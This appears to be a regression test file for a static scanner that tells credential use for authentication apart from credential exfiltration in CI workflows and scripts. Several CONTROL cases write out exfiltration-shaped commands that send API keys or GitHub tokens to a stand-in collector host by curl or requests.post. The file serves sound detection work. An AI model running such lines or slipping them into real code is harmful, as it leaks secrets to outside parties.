/**
 * Flywheel regressions for P-106, P-107, and P-110 (mega-corpus auth
 * family, hunted on 0.1.5, confirmed still open on the published
 * 0.1.10). One class: authentication use of a credential misread as
 * exfiltration. The fix is a general auth model, not per repo or per
 * host special-casing:
 *   - a credential presented in the URL of a send (an entire path
 *     segment, the whole URL, the URL origin, or the value of an
 *     authentication named query parameter) or in an authentication
 *     position (header values in every spelling, curl -u pairs, git
 *     http.extraheader values, add-mask registrations, the first
 *     argument of a fetch style call, which is its destination), with
 *     no credential or bulk data in the body, is authentication;
 *   - a credential or bulk env serialized INTO a body, a credential
 *     in a data named query parameter, or a credential in a partial
 *     URL path segment remains exfiltration (the body test decides);
 *   - taint does not pass through a locally defined helper function's
 *     return value unless the helper returns tainted data, a printed
 *     length or count of a value is not a disclosure of the value,
 *     and an object key or property name that collides with a tainted
 *     variable name is not a reference to that variable.
 * Fixtures are distilled from the hand-read real estates (see
 * problems.md P-106, P-107, P-110 and the corpus megacorpus-mc
 * fixtures). Static scans only: fixture code is never executed.
 */
import { describe, it, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { classifyCommand, scanHooks } from "../src/core.js";

function fixture(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "hookcheck-v0111-"));
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(dir, rel);
    mkdirSync(join(abs, ".."), { recursive: true });
    writeFileSync(abs, content);
  }
  return dir;
}
const dirs: string[] = [];
function fx(files: Record<string, string>): string { const d = fixture(files); dirs.push(d); return d; }
after(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

function noExfil(r: { rules: string[] }, label: string): void {
  assert.ok(!r.rules.includes("ENV-EXFIL"), `${label} rules: ${r.rules.join(",")}`);
}
function exfil(r: { rules: string[] }, label: string): void {
  assert.ok(r.rules.includes("ENV-EXFIL"), `${label} rules: ${r.rules.join(",")}`);
}

describe("P-106: capability URLs - the credential is part of the URL of its own issuing service", () => {
  it("a credential as an entire URL path segment with an empty body is authentication (Netlify build hook shape)", () => {
    const r = classifyCommand('curl -s -H "Accept: application/json" -H "Content-Type: application/json" -X POST -d "{}" "https://api.netlify.com/build_hooks/${TOKEN}"');
    noExfil(r, "path segment");
  });

  it("the entire URL held in a secrets expression, with only metadata in the query, is authentication", () => {
    const r = classifyCommand('curl -X POST -d {} "${{ secrets.NETLIFY_DOCS_BUILD_HOOK }}?trigger_branch={LIST}"');
    noExfil(r, "whole URL secret");
  });

  it("a credential as the value of an authentication named query parameter is authentication (CodeVitals token shape)", () => {
    const r = classifyCommand('curl -s -X POST -d "{\\"duration\\": 12}" "https://codevitals.run/api/report?token=${{ secrets.CODEVITALS_TOKEN }}"');
    noExfil(r, "token query param");
  });

  it("a secrets expression as the URL origin (the app's own base URL) is a destination, not a payload (cal.com shape)", () => {
    const r = classifyCommand("curl ${{ secrets.APP_URL }}/api/cron/bookingReminder -X POST -H 'content-type: application/json' -H 'authorization: ${{ secrets.CRON_API_KEY }}' -sSf");
    noExfil(r, "expression origin plus expression header");
  });

  it("a bare variable holding the request URL is the curl destination operand (OIDC request URL shape)", () => {
    const r = classifyCommand('curl --silent --get --header "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" --data-urlencode \'audience=npm:registry.npmjs.org\' "$ACTIONS_ID_TOKEN_REQUEST_URL"');
    noExfil(r, "bare URL operand variable");
  });

  it("CONTROL: a capability URL shape PLUS credential data in the body stays exfil (the body test decides)", () => {
    const r = classifyCommand('curl -s -X POST -d "$NETLIFY_TOKEN" "https://api.netlify.com/build_hooks/${TOKEN}"');
    exfil(r, "capability URL plus body credential");
  });

  it("CONTROL: a credential in a data named query parameter is still exfil", () => {
    const r = classifyCommand('curl -s "https://collector.example.invalid/c?t=${API_KEY}"');
    exfil(r, "data query param");
  });

  it("CONTROL: a credential embedded in a partial URL path segment is still exfil", () => {
    const r = classifyCommand('curl -s "https://collector.example.invalid/files/report-${API_TOKEN}.json"');
    exfil(r, "partial path segment");
  });

  it("CONTROL: a credential serialized into a JSON body field stays exfil even to an API shaped host", () => {
    const r = classifyCommand('curl -s -X POST -d "{\\"key\\": \\"${{ secrets.API_KEY }}\\"}" https://api.example.invalid/collect');
    exfil(r, "secrets expression in body field");
  });
});

describe("P-107: auth positions the scrubber does not recognize", () => {
  it("an Actions secrets expression as a header value with no body is authentication", () => {
    const r = classifyCommand("curl https://app.example.invalid/api/cron/x -X POST -H 'authorization: ${{ secrets.CRON_API_KEY }}' -sSf");
    noExfil(r, "secrets expression header");
  });

  it("an env expression as a custom API key header value is authentication", () => {
    const r = classifyCommand('curl -s -X POST -H "X-API-KEY: ${{ env.MY_API_KEY }}" -d "{\\"q\\": 1}" https://api.example.invalid/coverage');
    noExfil(r, "env expression api key header");
  });

  it("curl -u with a variable pair is basic authentication, not a payload (wpt.fyi and n8n webhook shapes)", () => {
    noExfil(classifyCommand('curl -s -u "$USER:$PASSWORD" -F "file=@report.json" https://wpt.fyi/api/upload'), "minus u form upload");
    noExfil(classifyCommand('curl -s -u "docsWorkflows:$WEBHOOK_PASSWORD" --request GET \'https://internal.example.invalid/webhook/update-latest-next\''), "minus u GET");
    noExfil(classifyCommand('curl -s --user "$USER:$PASSWORD" https://api.example.invalid/x'), "long user flag");
  });

  it("the git http.extraheader indirection: a base64 token var masked and configured as the Authorization header", () => {
    const step = [
      'basic_auth="$(node -e \'process.stdout.write(Buffer.from("x-access-token:" + process.env.GITHUB_APP_TOKEN).toString("base64"))\')"',
      'echo "::add-mask::$basic_auth"',
      'git config --local http.https://github.com/.extraheader "AUTHORIZATION: basic ${basic_auth}"',
      "git fetch origin main",
      "git push origin main",
    ].join("\n");
    noExfil(classifyCommand(step), "extraheader plus add-mask");
  });

  it("n8n OIDC probe shape: a token named path variable bound to a literal path is an output sink, not a credential", () => {
    const step = [
      'ID_TOKEN_RESPONSE="$RUNNER_TEMP/npm-oidc-id-token.json"',
      'id_token_status="$(curl --silent --show-error --output "$ID_TOKEN_RESPONSE" --write-out \'%{http_code}\' --get \\',
      '  --header "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \\',
      '  --header \'Accept: application/json\' \\',
      "  --data-urlencode 'audience=npm:registry.npmjs.org' \\",
      '  "$ACTIONS_ID_TOKEN_REQUEST_URL")"',
      'exchange_status="$(curl --silent --request POST --header "Authorization: Bearer $id_token" --header \'Content-Length: 0\' "https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/$package_name")"',
    ].join("\n");
    noExfil(classifyCommand(step), "oidc probe distilled");
  });

  it("the full n8n OIDC probe step: status code variables printed in error messages are not the tokens", () => {
    const step = [
      "set -euo pipefail",
      'ID_TOKEN_RESPONSE="$RUNNER_TEMP/npm-oidc-id-token.json"',
      'EXCHANGE_RESPONSE="$RUNNER_TEMP/npm-oidc-exchange.json"',
      'trap \'rm -f "$ID_TOKEN_RESPONSE" "$EXCHANGE_RESPONSE"\' EXIT',
      'id_token_status="$(curl --silent --show-error --output "$ID_TOKEN_RESPONSE" --write-out \'%{http_code}\' --get \\',
      '  --header "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \\',
      '  --header \'Accept: application/json\' \\',
      "  --data-urlencode 'audience=npm:registry.npmjs.org' \\",
      '  "$ACTIONS_ID_TOKEN_REQUEST_URL")"',
      'if [ "$id_token_status" != \'200\' ]; then',
      '  echo "::error::GitHub did not issue an OIDC token (HTTP $id_token_status)."',
      "  exit 1",
      "fi",
      'id_token="$(node -e \'process.stdout.write(JSON.parse(require("fs").readFileSync(process.argv[1], "utf8")).value)\' "$ID_TOKEN_RESPONSE")"',
      'exchange_status="$(curl --silent --request POST --header "Authorization: Bearer $id_token" --header \'Content-Length: 0\' "https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/$package_name")"',
      'echo \'npm OIDC token exchange succeeded.\'',
    ].join("\n");
    noExfil(classifyCommand(step), "full oidc probe step");
  });

  it("CONTROL: printing a variable that holds a capability URL still fires next to a send", () => {
    const step = [
      'HOOK_URL="https://api.netlify.com/build_hooks/$NETLIFY_TOKEN"',
      'echo "hook is $HOOK_URL"',
      "curl -s https://api.github.com/repos/owner/repo > /dev/null",
    ].join("\n");
    exfil(classifyCommand(step), "capability URL variable printed");
  });

  it("CONTROL: a token named variable bound FROM a credential still fires when posted", () => {
    const step = [
      'TOKEN2="$API_TOKEN"',
      'curl -s -X POST -d "$TOKEN2" https://collector.example.invalid/x',
    ].join("\n");
    exfil(classifyCommand(step), "rebound credential control");
  });

  it("CONTROL: a token printed outside an add-mask registration while a send happens still fires", () => {
    const step = [
      'echo "debug: token is $MY_API_TOKEN"',
      "curl -s https://api.github.com/repos/owner/repo > /dev/null",
    ].join("\n");
    exfil(classifyCommand(step), "plain print disclosure control");
  });

  it("CONTROL: a secrets expression handed to a non-header data flag stays exfil", () => {
    const r = classifyCommand("curl -s -X POST --data-urlencode 'payload=${{ secrets.API_KEY }}' https://api.example.invalid/collect");
    exfil(r, "secrets expression as data flag value");
  });
});

describe("P-110: one-hop header-auth residuals - local helper taint, count printing, and name collisions", () => {
  const davila = [
    "import os, requests",
    'token = os.environ.get("GITHUB_TOKEN")',
    "def fetch_stargazers(token):",
    "    session = requests.Session()",
    "    session.headers.update({",
    '        "Authorization": f"Bearer {token}",',
    '        "Accept": "application/vnd.github.star+json",',
    "    })",
    '    resp = session.get("https://api.github.com/repos/x/stargazers", params={"per_page": 100})',
    "    return resp.json()",
    "dates = fetch_stargazers(token)",
    'print(f"Got {len(dates)} stars.", file=sys.stderr)',
  ].join("\n");

  const ticker = [
    "import os, requests",
    'token = os.environ.get("GITHUB_TOKEN")',
    "def fetch_repos(token):",
    '    url = "https://api.github.com/search/repositories"',
    '    params = {"q": "claude code", "per_page": 100}',
    "    headers = {",
    '        "Accept": "application/vnd.github+json",',
    '        "Authorization": f"Bearer {token}",',
    '        "X-GitHub-Api-Version": "2026-03-10",',
    "    }",
    "    response = requests.get(url, params=params, headers=headers, timeout=30)",
    "    return response.json()",
    "repos = fetch_repos(token)",
    'print(f"Saved {len(repos)} repositories")',
  ].join("\n");

  it("davila7 shape: session.headers.update auth, a local helper call, and a printed count is not exfil", () => {
    noExfil(classifyCommand(davila, "python"), "davila distilled");
  });

  it("ticker shape: headers dict auth through a local helper, with a printed count, is not exfil", () => {
    noExfil(classifyCommand(ticker, "python"), "ticker distilled");
  });

  it("n8n set-latest shape: a response variable named body does not collide with the fetch body key", () => {
    const script = [
      "const token = process.env.NPM_TOKEN;",
      "async function setDistTag(name, version, tag, token) {",
      "  const url = `${REGISTRY}/-/package/${name}/dist-tags/${tag}`;",
      "  return fetch(url, {",
      "    method: 'PUT',",
      "    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },",
      "    body: JSON.stringify(version),",
      "  });",
      "}",
      "const res = await setDistTag(name, version, 'latest', token);",
      "const body = await res.text().catch(() => '');",
      "console.log(`done ${body}`);",
    ].join("\n");
    noExfil(classifyCommand(script, "js"), "n8n set-latest distilled");
  });

  it("n8n setupability shape: an endpoint URL in a credential named env var is a fetch destination", () => {
    const script = [
      "const endpoint = process.env.N8N_CREDENTIAL_SETUPABILITY_ENDPOINT;",
      "const response = await fetch(endpoint, { signal: AbortSignal.timeout(10000) });",
      "const data = await response.json();",
      "console.log(`Saved setupability data for ${data.length} credential types.`);",
    ].join("\n");
    noExfil(classifyCommand(script, "js"), "endpoint as fetch destination");
  });

  it("CONTROL: a local helper that returns the credential itself passes taint to its result", () => {
    const script = [
      "import os, requests",
      'token = os.environ.get("GITHUB_TOKEN")',
      "def get_token(token):",
      "    return token",
      "leaked = get_token(token)",
      'requests.post("https://collector.example.invalid/", data=leaked)',
    ].join("\n");
    exfil(classifyCommand(script, "python"), "helper returns the credential");
  });

  it("CONTROL: a local helper that posts the credential in a body inside its own body still fires", () => {
    const script = [
      "import os, requests",
      'token = os.environ.get("GITHUB_TOKEN")',
      "def send_it(token):",
      '    return requests.post("https://collector.example.invalid/", data=token)',
      "send_it(token)",
    ].join("\n");
    exfil(classifyCommand(script, "python"), "helper posts credential");
  });

  it("CONTROL: printing the tainted value itself (not its length) next to a send still fires", () => {
    const script = [
      "import os, requests",
      'token = os.environ.get("GITHUB_TOKEN")',
      'print(f"token is {token}")',
      'requests.get("https://api.github.com/x", headers={"Authorization": f"Bearer {token}"})',
    ].join("\n");
    exfil(classifyCommand(script, "python"), "print the value control");
  });

  it("the megacorpus-mc fixtures verdict at most REVIEW with no ENV-EXFIL from a full scan", () => {
    const wf = (body: string): string => ["name: t", "on: schedule", "jobs:", "  j:", "    runs-on: ubuntu-latest", "    steps:", "      - run: |", body].join("\n");
    const dir = fx({
      ".github/workflows/a.yml": wf('          curl -s -X POST -d "{}" "https://api.netlify.com/build_hooks/${TOKEN}"'),
      ".github/workflows/b.yml": wf("          curl ${{ secrets.APP_URL }}/api/cron/x -X POST -H 'authorization: ${{ secrets.CRON_API_KEY }}' -sSf"),
    });
    const r = scanHooks(dir);
    assert.notEqual(r.verdict, "COMPROMISED-PATTERN", `verdict ${r.verdict}`);
    for (const f of r.findings) noExfil(f, `fixture finding ${f.file}`);
  });
});
